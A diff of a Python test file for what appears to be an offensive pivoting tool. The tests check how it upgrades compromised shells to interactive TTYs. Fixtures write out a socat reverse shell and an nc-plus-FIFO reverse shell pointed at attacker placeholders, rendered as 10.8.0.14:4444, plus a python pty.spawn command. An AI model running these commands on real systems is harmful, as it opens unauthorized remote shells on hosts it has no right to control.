@@ -85,21 +85,58 @@ def test_parse_pty_verify_rejects_dumb_or_missing():
     assert v3["hasPty"] is False
 
 
-def test_upgrade_reverse_technique_deferred_with_reason():
+def test_upgrade_reverse_technique_returns_rendered_cmd():
+    """反向技法（socat/nc）返回按攻击机地址渲染的命令 + 明确指引，不再是「待 MS3」占位。"""
     from pivothub.service.tty import technique_kind, upgrade
 
     class Dummy:
         supports_pty_probe = False
         platform = "linux"
+        kind = "http-shell"
 
         def exec(self, cmd, timeout=15.0):
-            raise AssertionError("reverse 技法不应执行命令")
+            raise AssertionError("reverse 技法不应直接执行命令（需先开监听）")
 
-    fix = {"id": "lx-socat", "name": "socat 全交互 PTY"}
+    fix = {"id": "lx-socat", "name": "socat 全交互 PTY",
+           "cmd": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT"}
     assert technique_kind(fix) == "reverse"
-    out = upgrade(Dummy(), fix)
+    out = upgrade(Dummy(), fix, lhost="10.8.0.14", lport=4444)
     assert out["hasPty"] is False
-    assert "MS3" in out["reason"]
+    assert out["cmd"] == ("socat exec:'bash -li',pty,stderr,setsid,sigint,sane "
+                          "tcp:10.8.0.14:4444")          # $LHOST/$LPORT 已按攻击机渲染
+    assert "开监听" in out["reason"] and "MS3" not in out["reason"]
+
+
+def test_upgrade_pty_technique_on_reverse_channel():
+    """反弹通道本身就是交互 shell：PTY 技法经通道原始写入 + 回读验证，不再报「驱动不支持」。"""
+    from pivothub.service.tty import upgrade
+
+    class FakeChannel:
+        kind = "reverse-shell"
+        platform = "linux"
+        supports_pty_probe = False                # 通道驱动不该被 PTY 探针门槛卡住
+        raw_written = []
+
+        def write_raw(self, text):
+            self.raw_written.append(text)
+
+        def exec(self, cmd, timeout=15.0):
+            return type("R", (), {
+                "ok": True, "error": "",
+                "output": "/dev/pts/2\nTERM=xterm-256color\n40 120\nuid=0(root)\n"})()
+
+    fix = {"id": "lx-python", "name": "Python PTY",
+           "cmd": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"}
+    ch = FakeChannel()
+    out = upgrade(ch, fix)
+    assert out["hasPty"] is True and out["viaChannel"] is True
+    assert out["tty"] == "/dev/pts/2" and out["term"] == "xterm-256color"
+    assert ch.raw_written and "pty.spawn" in ch.raw_written[0]
+    # 已是反弹通道时，反向技法明确说明「不适用」，而不是默默失败
+    rev = upgrade(ch, {"id": "lx-nc-fifo", "name": "nc + FIFO 反向交互",
+                       "cmd": "rm /tmp/f; mkfifo /tmp/f; nc $LHOST $LPORT > /tmp/f"})
+    assert rev["hasPty"] is False and rev["fallback"] == "channel"
+    assert "已是反弹" in rev["reason"]
 
 
 def test_upgrade_inline_technique_executes_and_verifies():
